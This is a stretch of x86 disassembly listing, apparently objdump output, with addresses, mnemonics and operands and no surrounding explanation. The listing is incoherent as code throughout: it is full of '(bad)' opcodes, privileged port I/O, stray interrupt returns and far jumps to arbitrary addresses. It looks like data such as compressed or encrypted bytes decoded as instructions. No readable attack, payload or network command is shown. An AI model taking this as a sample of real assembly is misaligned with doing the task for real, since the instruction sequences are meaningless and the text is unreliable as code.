  40af1e:	ja     0x40af7a
  40af20:	pmaddwd mm7,QWORD PTR [eax-0x70]
  40af24:	or     eax,0xe31914a3
  40af29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af2a:	push   es
  40af2b:	pop    es
  40af2c:	xor    ecx,edx
  40af2e:	xchg   ecx,eax
  40af2f:	data16 or BYTE PTR [esi+0xbd2ae21],cl
  40af36:	outs   dx,BYTE PTR ds:[esi]
  40af37:	loopne 0x40aee3
  40af39:	cs or  al,BYTE PTR gs:[edi+0x23]
  40af3e:	test   al,0x72
  40af40:	in     al,dx
  40af41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af42:	push   edx
  40af43:	mov    ds:0xc6f23dec,al
  40af48:	iret   
  40af49:	outs   dx,BYTE PTR ds:[esi]
  40af4a:	dec    esi
  40af4b:	and    al,0x50
  40af4d:	lahf   
  40af4e:	push   esi
  40af4f:	xor    cl,BYTE PTR [esi]
  40af51:	das    
  40af52:	lahf   
  40af53:	xor    eax,0xc18a6bfd
  40af58:	add    bl,BYTE PTR [ecx+ebp*4]
  40af5b:	test   BYTE PTR [ebx-0x12],dh
  40af5e:	push   esi
  40af5f:	inc    esi
  40af60:	into   
  40af61:	lahf   
  40af62:	dec    esi
  40af63:	inc    esp
  40af64:	pop    ecx
  40af65:	jns    0x40afb5
  40af67:	jb     0x40af25
  40af69:	adc    ch,dl
  40af6b:	jnp    0x40aef1
  40af6d:	mov    ch,0x7d
  40af6f:	das    
  40af70:	mov    BYTE PTR [ebx],cl
  40af72:	loopne 0x40af86
  40af74:	adc    BYTE PTR [edx-0x2f823027],ch
  40af7a:	sbb    eax,0x590b272c
  40af7f:	mov    edx,0x8cdb4845
  40af84:	dec    edi
  40af85:	inc    esp
  40af86:	in     eax,dx
  40af87:	(bad)  
  40af88:	fidivr WORD PTR [ebx+0x71609e75]
  40af8e:	aad    0xa6
  40af90:	jo     0x40afdb
  40af92:	rcl    DWORD PTR [ebx],0x3c
  40af95:	rcr    BYTE PTR [ecx-0x30],0xd3
  40af99:	std    
  40af9a:	mov    al,0xc9
  40af9c:	cmc    
  40af9d:	add    eax,0x87d5a939
  40afa2:	ss sub esi,ebx
  40afa5:	push   esi
  40afa6:	xor    esi,DWORD PTR [ebx-0x62]
  40afa9:	sbb    ebx,DWORD PTR [ebp+0x74]
  40afac:	imul   ecx,esi,0x30
  40afaf:	sub    eax,0x845e494a
  40afb4:	ins    DWORD PTR es:[edi],dx
  40afb5:	and    bh,BYTE PTR ds:0x4b0d18af
  40afbb:	sub    BYTE PTR [edx+0x394c315e],0xe3
  40afc2:	out    dx,eax
  40afc3:	pop    esi
  40afc4:	jmp    0xf7eb:0x9e50b484
  40afcb:	jnp    0x40afc6
  40afcd:	es imul ebx,ecx
  40afd1:	sbb    DWORD PTR [ebp+0x56e9ddfa],ecx
  40afd7:	call   0xe8422747
  40afdc:	sbb    DWORD PTR [esi-0x36c4a519],edi
  40afe2:	pop    eax
  40afe3:	dec    ebp
  40afe4:	leave  
  40afe5:	retf   
  40afe6:	sub    DWORD PTR [ebx-0x6c],esi
  40afe9:	jp     0x40af98
  40afeb:	out    dx,eax
  40afec:	and    ch,BYTE PTR [ecx]
  40afee:	test   BYTE PTR [edx-0x74b9c5ef],dl
  40aff4:	out    dx,eax
  40aff5:	clc    
  40aff6:	or     bl,dh
  40aff8:	std    
  40aff9:	mov    ah,0x29
  40affb:	mov    WORD PTR [esi+ebp*8-0x1b81c30b],ds
  40b002:	les    ecx,FWORD PTR [ecx+ecx*1-0x630e5223]
  40b009:	(bad)  
  40b00a:	std    
  40b00b:	pusha  
  40b00c:	mov    ebp,0xe64372c2
  40b011:	jecxz  0x40afc1
  40b013:	(bad)  
  40b014:	in     eax,0xc4
  40b016:	inc    ecx
  40b017:	in     al,0xf9
  40b019:	xchg   BYTE PTR [ebp-0x80],ch
  40b01c:	sbb    esi,esp
  40b01e:	das    
  40b01f:	test   ah,0xc5
  40b022:	cmp    cl,ah
  40b024:	les    edx,FWORD PTR ds:[ecx-0x4feee6d3]
  40b02b:	aas    
  40b02c:	mov    ecx,DWORD PTR [eax-0x24e21daf]
  40b032:	vpunpckhdq xmm0,xmm4,xmm4
  40b036:	mov    cl,0xa2
  40b038:	dec    ecx
  40b039:	cmp    ch,BYTE PTR [ebp+0x1e997a0f]
  40b03f:	lds    esp,FWORD PTR [edi+eiz*4+0x49232699]
  40b046:	sbb    bl,ah
  40b048:	sbb    DWORD PTR [edx],ecx
  40b04a:	cmp    esi,DWORD PTR [edx]
  40b04c:	dec    edx
  40b04d:	mov    ds:0x281c0067,al
  40b052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b053:	iret   
  40b054:	inc    ebp
  40b055:	in     al,0xac
  40b057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b058:	test   BYTE PTR [eax+0x21],dh
  40b05b:	aad    0x8b
  40b05d:	retf   0x6b91
  40b060:	jmp    0x896a:0x13001d23
  40b067:	push   eax
  40b068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b069:	fcmovne st,st(0)
  40b06b:	outs   dx,DWORD PTR ds:[esi]
  40b06c:	adc    DWORD PTR [ebx+0x5267d55c],esi
  40b072:	test   BYTE PTR [edx],al
  40b074:	fisubr DWORD PTR [ecx]
  40b076:	sbb    eax,0xe406bfc4
  40b07b:	push   ds
  40b07c:	mov    dl,0x72
  40b07e:	(bad)  
  40b07f:	repz sub DWORD PTR [edx+0x4ea0e22d],edx
  40b086:	jo     0x40b03e
  40b088:	and    eax,esp
  40b08a:	sbb    BYTE PTR [eax-0x5c],bh
  40b08d:	int    0xf5
  40b08f:	fiadd  WORD PTR [edx-0xc86d9a6]
  40b095:	and    al,0x6e
  40b097:	cwde   
  40b098:	(bad)  
  40b09a:	mov    ds:0xce8ca3b6,eax
  40b09f:	popa   
  40b0a0:	idiv   BYTE PTR [edi+esi*2-0x3]
  40b0a4:	add    dh,0xc7
  40b0a7:	retf   0xd67
  40b0aa:	inc    esp
  40b0ab:	push   esp
  40b0ac:	jg     0x40b04c
  40b0ae:	xchg   ecx,eax
  40b0af:	les    edx,FWORD PTR [edx+0x1a98cdc6]
  40b0b5:	repz mov ebp,0xe6f48caa
  40b0bb:	test   DWORD PTR [eax-0x58ecbe44],0xe3cc8ea5
  40b0c5:	mov    dl,0x2f
  40b0c7:	sub    DWORD PTR [esi-0x54],0xffffff81
  40b0cb:	in     al,0x45
  40b0cd:	out    0x4d,eax
  40b0cf:	call   DWORD PTR ds:0x228ee71f
  40b0d5:	cmp    BYTE PTR [ebx],0xad
  40b0d8:	lds    esp,FWORD PTR [esi+eiz*2-0x13]
  40b0dc:	inc    eax
  40b0dd:	xchg   dl,ch
  40b0df:	mov    esi,0x326a06b3
  40b0e4:	test   DWORD PTR [edi-0x12],edi
  40b0e7:	aam    0x61
  40b0e9:	mov    cl,0xca
  40b0eb:	lea    edx,[esp+eiz*4-0x30]
  40b0ef:	mov    DWORD PTR es:[edx-0x7],esp
  40b0f3:	(bad)  
  40b0f4:	mov    ch,0xda
  40b0f6:	dec    esp
  40b0f7:	test   eax,0xd66ca309
  40b0fc:	mov    al,ds:0x947cc7ee
  40b101:	mov    bh,0x73
  40b103:	sub    BYTE PTR [esi-0x43],al
  40b106:	and    al,0x29
  40b108:	nop
  40b109:	std    
  40b10a:	div    cl
  40b10c:	leave  
  40b10d:	fdivr  DWORD PTR [esi+edi*4+0x43]
  40b111:	fldcw  WORD PTR [ebp+esi*1-0x55]
  40b115:	push   es
  40b116:	dec    BYTE PTR ds:[edi+0x28462e24]
  40b11d:	sub    ecx,eax
  40b11f:	and    al,BYTE PTR [esi+0x71628008]
  40b125:	pop    eax
  40b126:	add    eax,0x36153f2b
  40b12b:	push   ebx
  40b12c:	or     eax,0xe2e9a7ce
  40b131:	mov    DWORD PTR [esi],edi
  40b133:	in     al,dx
  40b134:	inc    ecx
  40b135:	or     ebx,DWORD PTR [ecx-0x52]
  40b138:	pop    ds
  40b139:	outs   dx,DWORD PTR ds:[esi]
  40b13a:	jb     0x40b185
  40b13c:	in     al,dx
  40b13d:	in     eax,dx
  40b13e:	pop    es
  40b13f:	pop    esp
  40b140:	adc    DWORD PTR [edi-0x3a],ecx
  40b143:	je     0x40b0e1
  40b145:	stos   BYTE PTR es:[edi],al
  40b146:	fcomp  DWORD PTR [edi]
  40b148:	lds    ecx,FWORD PTR [ecx-0x75]
  40b14b:	idiv   BYTE PTR [ebx-0x2ee593d6]
  40b151:	pop    eax
  40b152:	ins    BYTE PTR es:[edi],dx
  40b153:	xchg   edx,eax
  40b154:	pusha  
  40b155:	scas   al,BYTE PTR es:[edi]
  40b156:	fwait
  40b157:	clc    
  40b158:	scas   al,BYTE PTR es:[edi]
  40b159:	push   ebp
  40b15a:	es pop ebx
  40b15c:	fsubr  QWORD PTR [edx-0x1a513719]
  40b162:	adc    bh,al
  40b164:	or     bl,bl
  40b166:	cmp    DWORD PTR [ebp+edx*4+0x3d],esi
  40b16a:	sub    dh,bh
  40b16c:	push   es
  40b16d:	xchg   BYTE PTR [eax+0x6aa674c9],al
  40b173:	xchg   ebp,eax
  40b174:	loopne 0x40b1d1
  40b176:	out    dx,eax
  40b177:	cmp    ah,BYTE PTR [edi-0x46]
  40b17a:	inc    ebp
  40b17b:	ins    BYTE PTR es:[edi],dx
  40b17c:	hlt    
  40b17d:	iret   
  40b17e:	push   0xf1ec8090
  40b183:	sub    al,0x5e
  40b185:	lds    ecx,FWORD PTR [ecx+0x706fbae8]
  40b18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b18c:	mov    ebx,0xca8d487
  40b191:	pushf  
  40b192:	mov    ds:0x95b684d0,al
  40b197:	pusha  
  40b198:	hlt    
  40b199:	fmul   QWORD PTR [ebx+0x454e596a]
  40b19f:	adc    ebp,0x93016066
  40b1a5:	pmaddwd mm0,mm7
  40b1a8:	sbb    edi,DWORD PTR [esi+0x61]
  40b1ab:	and    BYTE PTR [ecx-0x51],bl
  40b1ae:	imul   ebp,DWORD PTR [eax+0x6eed4929],0xf8da9607
  40b1b8:	jp     0x40b16c
  40b1ba:	std    
  40b1bb:	call   0xda971071
  40b1c0:	fidiv  WORD PTR [eax+0x6f]
  40b1c3:	sub    eax,0x121e946c
  40b1c8:	jecxz  0x40b228
  40b1ca:	adc    ah,dl
  40b1cc:	outs   dx,DWORD PTR ds:[esi]
  40b1cd:	bound  esi,QWORD PTR [edx-0x46c77759]
  40b1d3:	mov    edx,0x5088112c
  40b1d8:	fstp   DWORD PTR [edx+0x5afdd98c]
  40b1de:	leave  
  40b1df:	pop    ss
  40b1e0:	cmp    edi,DWORD PTR [edi+0x2a457e83]
  40b1e6:	sahf   
  40b1e7:	xor    edi,DWORD PTR [edx+0x42128c13]
  40b1ed:	mov    DWORD PTR [ecx-0x56],esp
  40b1f0:	call   0x2791:0x4e654a41
  40b1f7:	(bad)  
  40b1f8:	adc    esi,esp
  40b1fa:	in     al,dx
  40b1fb:	fistp  QWORD PTR [esi]
  40b1fd:	test   eax,0x1bf6abd6
  40b202:	dec    esp
  40b203:	aaa    
  40b204:	mov    esp,0xf5ef18f6
  40b209:	dec    ebp
  40b20a:	fist   WORD PTR [ebp+0xe]
  40b20d:	mov    ds:0x5c6e4cc7,al
  40b212:	sar    BYTE PTR [ebx],cl
  40b214:	jmp    0xd968:0x48e551b8
  40b21b:	push   edi
  40b21c:	pop    ecx
  40b21d:	cmp    al,0xb9
  40b21f:	cmp    eax,0x5fa61582
  40b224:	ins    BYTE PTR es:[edi],dx
  40b225:	adc    ebx,0xe4d256e4
  40b22b:	lock jb 0x40b1f8
  40b22e:	popf   
  40b22f:	and    al,0x8d
  40b231:	ror    BYTE PTR [ecx],cl
  40b233:	push   ds
  40b234:	adc    DWORD PTR ss:[ebp+0x27c65164],eax
  40b23b:	int3   
  40b23c:	pop    ebp
  40b23d:	push   ebp
  40b23e:	push   ss
  40b23f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b241:	aad    0x1f
  40b243:	and    BYTE PTR [ebx-0x789fd4b9],cl
  40b249:	adc    eax,0xee2ef1
  40b24e:	push   edx
  40b24f:	arpl   WORD PTR [eax-0x10],bx
  40b252:	(bad)  
  40b253:	loopne 0x40b21c
  40b255:	pop    esi
  40b256:	push   ss
  40b257:	mov    ah,0x59
  40b259:	addr16 (bad) 
  40b25b:	mov    esp,0x446a504e
  40b260:	lds    eax,FWORD PTR [edx+0x3b]
  40b263:	loop   0x40b253
  40b265:	cdq    
  40b266:	out    0xd4,al
  40b268:	jns    0x40b2ad
  40b26a:	mov    ds:0x5537ee7c,eax
  40b26f:	cwde   
  40b270:	lahf   
  40b271:	mov    eax,0x5c55864e
  40b276:	ins    DWORD PTR es:[edi],dx
  40b277:	std    
  40b278:	xor    bh,BYTE PTR [ebp+0x22]
  40b27b:	scas   eax,DWORD PTR es:[edi]
  40b27c:	jno    0x40b2f9
  40b27e:	dec    ebx
  40b27f:	mov    ch,0x38
  40b281:	es mov esi,0x31da5d5c
  40b287:	pop    es
  40b288:	(bad)  
  40b289:	mov    ch,0x4f
  40b28b:	popa   
  40b28c:	push   ebp
  40b28d:	jbe    0x40b27a
  40b28f:	in     eax,dx
  40b290:	scas   al,BYTE PTR es:[edi]
  40b291:	xchg   edi,eax
  40b292:	fmul   st(1),st
  40b294:	cld    
  40b295:	pop    edx
  40b296:	out    dx,eax
  40b297:	iret   
  40b298:	pop    esp
  40b299:	or     dh,BYTE PTR [ecx]
  40b29b:	mov    ch,0xb
  40b29d:	dec    edx
  40b29e:	push   ebp
  40b29f:	mov    cl,0x34
  40b2a1:	pop    DWORD PTR [ecx-0x2d54257c]
  40b2a7:	rcr    BYTE PTR [edi],0x51
  40b2aa:	rcl    cl,0x96
  40b2ad:	lea    ecx,[edx]
  40b2af:	int3   
  40b2b0:	or     DWORD PTR [eax+edi*2-0x4],ecx
  40b2b4:	sub    BYTE PTR [esi+0x1c36fa0b],0x4e
  40b2bb:	shl    BYTE PTR [eax-0xc],1
  40b2be:	cmp    edx,DWORD PTR [ecx-0x112fcef5]
  40b2c4:	das    
  40b2c5:	stos   DWORD PTR es:[edi],eax
  40b2c6:	jmp    0x40b315
  40b2c8:	inc    ebp
  40b2c9:	cs repz cli 
  40b2cc:	xor    esi,DWORD PTR [ebx]
  40b2ce:	fucomp st(2)
  40b2d0:	pop    ss
  40b2d1:	xchg   BYTE PTR ds:0xe5f97887,ah
  40b2d7:	inc    edi
  40b2d8:	mov    edx,DWORD PTR [edx+edi*4]
  40b2db:	popf   
  40b2dc:	mov    ah,0xe5
  40b2de:	jle    0x40b29c
  40b2e0:	mov    DWORD PTR [ebx-0x6c682360],0xa84c85a7
  40b2ea:	jmp    FWORD PTR [esi+0x46]
  40b2ed:	inc    edx
  40b2ee:	gs imul esp,esp,0x6017f896
  40b2f5:	xchg   ecx,eax
  40b2f6:	ret    0x6e
  40b2f9:	xchg   ecx,eax
  40b2fa:	jb     0x40b31b
  40b2fc:	leave  
  40b2fd:	jb     0x40b2a5
  40b2ff:	(bad)  
  40b300:	repz mov ebp,0x702bf968
  40b306:	call   0x5ffdd2d9
  40b30b:	sti    
  40b30c:	or     bl,BYTE PTR [ebx+0x7ccbe18f]
  40b312:	leave  
  40b313:	ds mov esi,0x967e4d3c
  40b319:	dec    edx
  40b31a:	mov    ebp,0xae0297c3
  40b31f:	sub    DWORD PTR [eax+0x7796def8],esp
  40b325:	dec    ebp
  40b326:	xchg   BYTE PTR [esi+0x51a691e1],al
  40b32c:	and    eax,0x7223ac51
  40b331:	cwde   
  40b332:	cmp    esp,ebx
  40b334:	sub    DWORD PTR [edi-0x76ee1656],edi
  40b33a:	test   BYTE PTR [eax],ch
  40b33c:	adc    BYTE PTR [ebp-0x6bf920c0],dh
  40b342:	jmp    0x40b310
  40b344:	cmp    dl,BYTE PTR [edi+esi*2+0x6277c1bb]
  40b34b:	mov    al,ds:0x7bd525fb
  40b350:	fs xchg ecx,eax
  40b352:	xchg   ebx,eax
  40b353:	scas   al,BYTE PTR es:[edi]
  40b354:	mov    esi,0x670ad014
  40b359:	push   cs
  40b35a:	out    dx,al
  40b35b:	cld    
  40b35c:	pop    edi
  40b35d:	mov    ds:0xec6940a,al
  40b362:	push   eax
  40b363:	shl    ebx,1
  40b365:	ja     0x40b30f
  40b367:	sub    ch,BYTE PTR ds:0x187b409a
  40b36d:	mov    eax,0x42f11ab2
  40b372:	iret   
  40b373:	shl    dl,cl
  40b375:	(bad)  
  40b376:	js     0x40b3f0
  40b378:	push   ds
  40b379:	shl    DWORD PTR [esi+ebp*1-0x33],1
  40b37d:	std    
  40b37e:	and    al,0x0
  40b380:	cmp    DWORD PTR [ecx+edx*2+0x1146f2b1],edx
  40b387:	or     al,0xea
  40b389:	mov    BYTE PTR [esi-0x64],0x9
  40b38d:	ins    DWORD PTR es:[edi],dx
  40b38e:	pop    es
  40b38f:	in     al,dx
  40b390:	call   0x7bb0ab20
  40b395:	bound  edx,QWORD PTR [esi-0x6cf4fc30]
  40b39b:	shl    DWORD PTR [edx-0x2d],1
  40b39e:	lods   eax,DWORD PTR ds:[esi]
  40b39f:	mov    edi,0x199cc173
  40b3a4:	sub    ah,dh
  40b3a6:	loope  0x40b3bb
  40b3a8:	loope  0x40b421
  40b3aa:	mov    bh,0x70
  40b3ac:	xchg   esp,eax
  40b3ad:	int    0xf8
  40b3af:	jmp    0xfc99:0x2e35c64f
  40b3b6:	sub    DWORD PTR ds:0xf84c1724,edx
  40b3bc:	mov    edx,0xaac3844e
  40b3c1:	scas   al,BYTE PTR es:[edi]
  40b3c2:	inc    eax
  40b3c3:	or     esi,0x9
  40b3c6:	and    ah,BYTE PTR [ebx+ebp*1+0x4bb3aaad]
  40b3cd:	fmul   QWORD PTR [esi]
  40b3cf:	(bad)  
  40b3d0:	stos   DWORD PTR es:[edi],eax
  40b3d1:	mov    esi,0xc622bcdb
  40b3d6:	(bad)  
  40b3d7:	std    
  40b3d8:	popa   
  40b3d9:	jne    0x40b379
  40b3db:	inc    BYTE PTR [ebx-0x56]
  40b3de:	add    esi,DWORD PTR [ecx+0x2]
  40b3e1:	dec    edi
  40b3e2:	sar    DWORD PTR [edx+edi*1+0x1872072c],0xc3
  40b3ea:	idiv   BYTE PTR [ebp-0x48]
  40b3ed:	imul   ebp,DWORD PTR [ecx+0x6e4ab808],0xffffffdd
  40b3f4:	mov    ch,0xcb
  40b3f6:	adc    ecx,DWORD PTR [edi-0x41]
  40b3f9:	xchg   esp,eax
  40b3fa:	lahf   
  40b3fb:	add    al,0x98
  40b3fd:	imul   edx,DWORD PTR [esi-0x7b614dbc],0x7d4449d3
  40b407:	inc    edx
  40b408:	es pop ebp
  40b40a:	sub    al,0x3
  40b40c:	iret   
  40b40d:	mov    fs,WORD PTR [ecx+0x45e42ffb]
  40b413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b414:	arpl   WORD PTR [esi-0x77],bp
  40b417:	adc    DWORD PTR [edi+0x396a6161],eax
  40b41d:	addr16 call 0x3df6e9a6
  40b423:	mov    eax,ds:0x67b088ff
  40b428:	mov    BYTE PTR [eax],dl
  40b42a:	ret    0x39db
  40b42d:	xor    al,0x5f
  40b42f:	and    esp,DWORD PTR [ecx-0x66]
  40b432:	mov    es,ebx
  40b434:	push   ss
  40b435:	mov    cl,0x5b
  40b437:	scas   eax,DWORD PTR es:[edi]
  40b438:	add    BYTE PTR [ebx+0x56f0904],dl
  40b43e:	retf   0xcbc4
  40b441:	pop    eax
  40b442:	or     dh,dh
  40b444:	scas   eax,DWORD PTR es:[edi]
  40b445:	fwait
  40b446:	js     0x40b48f
  40b448:	push   esi
  40b449:	cmp    dl,BYTE PTR [esi+0x2b]
  40b44c:	pop    es
  40b44d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b44e:	in     al,dx
  40b44f:	jmp    0x40b477
  40b451:	fisttp WORD PTR [ecx+0x7ef65c91]
  40b457:	std    
  40b458:	icebp  
  40b459:	stos   DWORD PTR es:[edi],eax
  40b45a:	fsubr  DWORD PTR [ebx]
  40b45c:	xchg   edx,eax
  40b45d:	mov    ds:0x70209217,eax
  40b462:	cs (bad) 
  40b464:	or     esi,ebx
  40b466:	dec    eax
  40b467:	std    
  40b468:	xchg   edx,eax
  40b469:	push   edi
  40b46a:	les    edx,FWORD PTR [ebx-0x1a]
  40b46d:	push   esi
  40b46e:	push   esp
  40b46f:	sub    eax,DWORD PTR [esi+0x255568ce]
  40b475:	sub    al,0xcb
  40b477:	xor    DWORD PTR [ebp-0x334e3142],ebx
  40b47d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b47e:	cmp    BYTE PTR [eax-0x718a5664],ch
  40b484:	sahf   
  40b485:	add    bh,0xc7
  40b488:	pop    ds
  40b489:	xor    edi,ebp
  40b48b:	cli    
  40b48c:	mov    esp,0x9059d3c9
  40b491:	mov    ebp,DWORD PTR [edi]
  40b493:	xchg   ebp,eax
  40b494:	(bad)  
  40b495:	mov    ds:0x8c3c991e,eax
  40b49a:	stc    
  40b49b:	das    
  40b49c:	fwait
  40b49d:	inc    ebp
  40b49e:	mov    ?,edi
  40b4a0:	sahf   
  40b4a1:	lock jle 0x40b4f3
  40b4a4:	out    dx,al
  40b4a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a6:	aad    0xb5
  40b4a8:	pop    ss
  40b4a9:	mov    al,0x4a
  40b4ab:	mov    dh,0xc4
  40b4ad:	sub    al,0x81
  40b4af:	mov    ebx,0xe069ffe5
  40b4b4:	sub    ebx,DWORD PTR [ebx+eiz*2+0x70]
  40b4b8:	sub    eax,0x720bee3b
  40b4bd:	(bad)  
  40b4bf:	mov    dh,0xe8
  40b4c1:	sbb    BYTE PTR [ebp+0x5a],dh
  40b4c4:	add    bh,cl
  40b4c6:	sti    
  40b4c7:	cmp    al,0xb0
  40b4c9:	or     DWORD PTR [ebp+0x7d7d8ebf],edi
  40b4cf:	and    dh,ah
  40b4d1:	imul   edi,DWORD PTR [ecx],0xfffffff4
  40b4d4:	adc    BYTE PTR [ecx+0x71],dl
  40b4d7:	mov    ebp,0xd95cc110
  40b4dc:	jg     0x40b535
  40b4de:	sub    eax,0x92f6d6a0
  40b4e3:	aas    
  40b4e4:	shl    BYTE PTR [esi+0x4b2f4d36],1
  40b4ea:	xor    bl,BYTE PTR [eax]
  40b4ec:	jne    0x40b471
  40b4ee:	and    BYTE PTR [esi+0x590d699e],cl
  40b4f4:	mov    ebp,0xcb488a50
  40b4f9:	or     DWORD PTR [ecx+0x2c],0x8f4679a3
  40b500:	retf   0xcd53
  40b503:	pusha  
  40b504:	mov    dh,al
  40b506:	out    dx,eax
  40b507:	sti    
  40b508:	outs   dx,DWORD PTR ds:[esi]
  40b509:	ret    
  40b50a:	(bad)  
  40b50b:	mov    esp,0xfdbe0155
  40b510:	xchg   edx,eax
  40b511:	jne    0x40b4f4
  40b513:	mov    DWORD PTR [edx],esi
  40b515:	lods   eax,DWORD PTR ds:[esi]
  40b516:	and    edx,esp
  40b518:	mov    eax,0xa24fde92
  40b51d:	xor    dl,BYTE PTR [edx-0x1a8473c2]
  40b523:	or     edi,DWORD PTR [edx-0x6d]
  40b526:	push   0x8ea8bf10
  40b52b:	fdivrp st(6),st
  40b52d:	jno    0x40b5aa
  40b52f:	dec    edi
  40b530:	dec    esp
  40b531:	into   
  40b532:	and    esp,ecx
  40b534:	fdivr  DWORD PTR ds:0x32a56814
  40b53a:	icebp  
  40b53b:	inc    esp
  40b53c:	xchg   esi,eax
  40b53d:	add    BYTE PTR [edx+0x4f],dl
  40b540:	fmul   DWORD PTR [edx+0x312fbd16]
  40b546:	pop    esp
  40b547:	and    al,dl
  40b549:	dec    ebp
  40b54a:	xor    al,0x20
  40b54c:	cmp    edx,ecx
  40b54e:	jne    0x40b4ee
  40b550:	std    
  40b551:	fwait
  40b552:	push   es
  40b553:	in     al,dx
  40b554:	cmp    BYTE PTR [edx+ebp*8+0x5],bl
  40b558:	cmp    eax,0xcf5c3c1c
  40b55d:	xor    BYTE PTR [ebx],al
  40b55f:	push   ds
  40b560:	shr    BYTE PTR [edi+edi*8],1
  40b563:	stos   BYTE PTR es:[edi],al
  40b564:	push   cs
  40b565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b566:	icebp  
  40b567:	test   al,0xe0
  40b569:	mov    ds:0xe568455d,eax
  40b56e:	dec    eax
  40b56f:	add    edi,DWORD PTR [edx+0x15aa6291]
  40b575:	add    eax,0xfd1a7e55
  40b57a:	lods   eax,DWORD PTR ds:[esi]
  40b57b:	gs sub ch,ch
  40b57e:	test   BYTE PTR [ecx+eax*1],dh
  40b581:	mov    eax,ds:0xac405491
  40b586:	popa   
  40b587:	jp     0x40b5cb
  40b589:	ss std 
  40b58b:	in     eax,dx
  40b58c:	xchg   ebp,eax
  40b58d:	mov    dh,0x8b
  40b58f:	imul   edx,DWORD PTR [eax+0x6123e3c3],0xffffffba
  40b596:	repnz mov cl,0x6d
  40b599:	push   eax
  40b59a:	in     eax,0xd
  40b59c:	cmp    al,0xd6
  40b59e:	jo     0x40b5c7
  40b5a0:	push   edx
  40b5a1:	popf   
  40b5a2:	ficom  DWORD PTR [ebx+0x4c]
  40b5a5:	sub    dh,0x45
  40b5a8:	cmp    al,0xa5
  40b5aa:	sbb    BYTE PTR [esi],ah
  40b5ac:	clc    
  40b5ad:	mov    ecx,0x87751bc3
  40b5b2:	pop    ds
  40b5b3:	add    DWORD PTR [ecx+0x21],edx
  40b5b6:	push   es
  40b5b7:	stc    
  40b5b8:	inc    esp
  40b5b9:	jge    0x40b621
  40b5bb:	xor    DWORD PTR ds:0xdcd856ae,edi
  40b5c1:	sbb    ecx,DWORD PTR [eax-0x7fa5ef39]
  40b5c7:	jns    0x40b621
  40b5c9:	scas   eax,DWORD PTR es:[edi]
  40b5ca:	(bad)  
  40b5cb:	mov    edx,0xb3d8ce12
  40b5d0:	push   cs
  40b5d1:	pop    ds
  40b5d2:	imul   edx,edi,0xffffffaf
  40b5d5:	mov    BYTE PTR [ecx],bl
  40b5d7:	sbb    bl,BYTE PTR [ebx+0x43]
  40b5da:	into   
  40b5db:	push   ebx
  40b5dc:	xchg   DWORD PTR [esi],esi
  40b5de:	push   esi
  40b5df:	sahf   
  40b5e0:	(bad)  
  40b5e1:	out    dx,al
  40b5e2:	mov    bh,0xd3
  40b5e4:	fwait
  40b5e5:	rcr    esp,0x37
  40b5e8:	fwait
  40b5e9:	into   
  40b5ea:	nop
  40b5eb:	sbb    eax,DWORD PTR [ebx+0x6ac8e264]
  40b5f1:	inc    ebx
  40b5f2:	das    
  40b5f3:	jl     0x40b5ca
  40b5f5:	popf   
  40b5f6:	push   ebx
  40b5f7:	fdivr  QWORD PTR [ecx]
  40b5f9:	jnp    0x40b656
  40b5fb:	mov    WORD PTR [edx],ds
  40b5fd:	into   
  40b5fe:	mov    BYTE PTR [edx+0x42],bh
  40b601:	repnz xor esi,DWORD PTR [ebp-0x6b]
  40b605:	adc    bh,BYTE PTR [ecx+0x6718d4b8]
  40b60b:	push   ebx
  40b60c:	or     BYTE PTR [eax-0x32752cfd],0x59
  40b613:	sar    BYTE PTR [ecx-0x2a],1
  40b616:	lds    ebx,FWORD PTR [ebx]
  40b618:	mov    bl,0xbc
  40b61a:	out    0x6b,eax
  40b61c:	(bad)  
  40b61d:	adc    ebx,eax
  40b61f:	and    esp,DWORD PTR fs:[esi]
  40b622:	icebp  
  40b623:	pop    eax
  40b624:	jmp    0x2ebf556c
  40b629:	mul    DWORD PTR [edx+eax*1]
  40b62c:	push   cs
  40b62d:	xchg   edi,eax
  40b62e:	(bad)  
  40b630:	int3   
  40b631:	or     eax,0x8dde6997
  40b636:	jmp    0x66aa:0x5bc3fb38
  40b63d:	jno    0x40b627
  40b63f:	mov    esi,0xcd55e314
  40b644:	sub    dh,bl
  40b646:	sbb    al,0x36
  40b648:	aad    0xb
  40b64a:	sbb    al,0xc2
  40b64c:	xchg   edi,eax
  40b64d:	pusha  
  40b64e:	ss aas 
  40b650:	call   0xfe83be2d
  40b655:	add    eax,DWORD PTR [ebx+ebx*8]
  40b658:	pusha  
  40b659:	rol    eax,0x33
  40b65c:	jns    0x40b682
  40b65e:	inc    esp
  40b65f:	inc    edx
  40b660:	test   BYTE PTR [edi+0x58],ch
  40b663:	pop    ds
  40b664:	fadd   QWORD PTR [edx-0x23]
  40b667:	mov    ch,0x56
  40b669:	adc    eax,0x802de62
  40b66e:	nop
  40b66f:	(bad)  
  40b670:	int    0x77
  40b672:	and    al,0x55
  40b674:	sub    DWORD PTR [eax+0x16b3d8a5],esi
  40b67a:	xor    al,0x7b
  40b67c:	in     eax,0x12
  40b67e:	mov    bh,0xac
  40b680:	pop    ds
  40b681:	mov    cl,0xaa
  40b683:	das    
  40b684:	and    al,dl
  40b686:	scas   eax,DWORD PTR es:[edi]
  40b687:	outs   dx,DWORD PTR ds:[esi]
  40b688:	xchg   esp,eax
  40b689:	clc    
  40b68a:	(bad)  
  40b68b:	mov    dh,0xc6
  40b68d:	out    dx,eax
  40b68e:	and    eax,edx
  40b690:	enter  0xaee,0xd
  40b694:	fnsave [esi-0x402c1772]
  40b69a:	lock (bad) 
  40b69c:	jl     0x40b6c3
  40b69e:	xchg   ebp,eax
  40b69f:	ret    0x3ce0
  40b6a2:	loopne 0x40b70f
  40b6a4:	arpl   WORD PTR [ecx-0x3d],bx
  40b6a7:	iret   
  40b6a8:	js     0x40b696
